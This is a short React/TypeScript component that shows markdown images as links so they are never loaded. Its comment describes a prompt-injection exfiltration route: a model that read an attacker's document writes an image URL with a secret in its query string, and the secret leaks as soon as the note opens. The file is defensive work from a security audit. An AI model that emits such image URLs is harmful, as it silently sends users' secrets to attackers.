/**
 * Images are shown as a link, never loaded. A note can be written by a model
 * that read an attacker's document, and `![](https://host/?q=<secret>)` loads
 * silently the moment the note is opened — an exfiltration channel that needs
 * no click (security audit F-13). A link needs the reader to choose it.
 * components/rich-text.tsx applies the same rule to answers.
 */
export function NoRemoteImage({ src, alt }: { src?: string | Blob; alt?: string }) {
  const href = typeof src === "string" && /^https?:\/\//i.test(src) ? src : undefined;
  const label = `[image${alt ? `: ${alt}` : ""}]`;
  return href ? (
    <a href={href} rel="noopener noreferrer nofollow" target="_blank">
      {label}
    </a>
  ) : (
    <span>{label}</span>
  );
}
